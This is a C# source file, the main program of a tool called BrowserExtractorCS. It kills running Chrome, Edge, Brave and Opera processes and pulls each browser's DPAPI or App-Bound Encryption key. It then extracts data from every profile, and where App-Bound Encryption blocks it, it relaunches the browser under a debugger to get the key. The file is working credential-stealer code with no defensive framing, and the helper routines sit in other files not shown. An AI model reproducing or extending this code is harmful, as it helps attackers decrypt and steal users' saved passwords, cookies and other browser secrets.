using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static BrowserExtractorCS.BrowserExtractor;

namespace BrowserExtractorCS
{
    class Program
    {
        static void Main(string[] args)
        {
            if (IntPtr.Size != 8)
            {
                Console.WriteLine("Error: This application must run as a 64-bit process.");
                Console.WriteLine("Please ensure the project is built for x64 and 'Prefer 32-bit' is disabled.");
                Console.ReadKey();
                return;
            }

            if (args.Length > 0 && args[0] == "--test")
            {
                RunTests();
                return;
            }

            var configs = GetConfigs();

            KillProcessesByName("chrome.exe");
            KillProcessesByName("msedge.exe");
            KillProcessesByName("brave.exe");
            KillProcessesByName("opera.exe");
            KillProcessesByName("launcher.exe");

            foreach (var config in configs)
            {
                string userDataDir = GetUserDataDir(config.UserDataSubdir, config.UseRoaming);
                if (userDataDir == null)
                {
                    Console.WriteLine($"User data directory not found for {config.Name}, skipping...");
                    continue;
                }

                string exePath = null;
                foreach (var path in config.ExePaths)
                {
                    if (File.Exists(path))
                    {
                        exePath = path;
                        break;
                    }
                }

                if (exePath == null)
                {
                    Console.WriteLine($"Executable not found for {config.Name}, skipping...");
                    continue;
                }

                Console.WriteLine($"Processing {config.Name}...");

                var v10KeyInfo = GetV10Key(userDataDir);
                bool shouldDebug = config.HasAbe;

                if (v10KeyInfo != null)
                {
                    byte[] key = v10KeyInfo.Value.Key;
                    bool isDpapi = v10KeyInfo.Value.IsDpapi;

                    if (isDpapi && !config.HasAbe)
                    {
                        Console.WriteLine($"Found DPAPI key for {config.Name}, extracting immediately...");
                        ExtractAllProfilesData(null, config, userDataDir);
                        shouldDebug = false;
                    }
                    else if (!isDpapi && !config.HasAbe)
                    {
                        Console.WriteLine($"Found ABE key for {config.Name}, extracting immediately...");
                        ExtractAllProfilesData(key, config, userDataDir);
                        shouldDebug = false;
                    }
                }

                if (!shouldDebug) continue;

                STARTUPINFO si = new STARTUPINFO();
                si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                // Using lpCommandLine for both exe and args is most common
                string cmdStr = $"\"{exePath}\" --no-first-run --no-default-browser-check";
                IntPtr pCmdLine = Marshal.StringToHGlobalUni(cmdStr);

                try
                {
                    bool success = CreateProcess(
                        null,
                        pCmdLine,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
                        IntPtr.Zero,
                        null,
                        ref si,
                        out pi
                    );

                    if (!success)
                    {
                        Console.WriteLine($"Failed to create {config.Name} process. Error: {Marshal.GetLastWin32Error()}");
                        continue;
                    }

                    Console.WriteLine($"Started {config.Name} with PID: {pi.dwProcessId}");

                    DebugLoop(pi.dwProcessId, pi.hProcess, config, userDataDir);

                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                finally
                {
                    Marshal.FreeHGlobal(pCmdLine);
                }
            }

            Console.WriteLine("Done. Press any key to exit.");
            Console.ReadKey();
        }

        static void RunTests()
        {
            Console.WriteLine("Running core logic verification tests...");
            var configs = GetConfigs();
            if (configs != null && configs.Count > 0)
                Console.WriteLine($"[PASS] Configuration loaded: {configs.Count} browsers.");
            else
                Console.WriteLine("[FAIL] Configuration failed.");

            try
            {
                IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snapshot != (IntPtr)(-1))
                {
                    Console.WriteLine("[PASS] Win32 P/Invoke check.");
                    CloseHandle(snapshot);
                }
                else
                    Console.WriteLine("[FAIL] Win32 P/Invoke check.");
            }
            catch (Exception ex) { Console.WriteLine($"[FAIL] Win32 check: {ex.Message}"); }
            Console.WriteLine("Tests completed.");
        }
    }
}
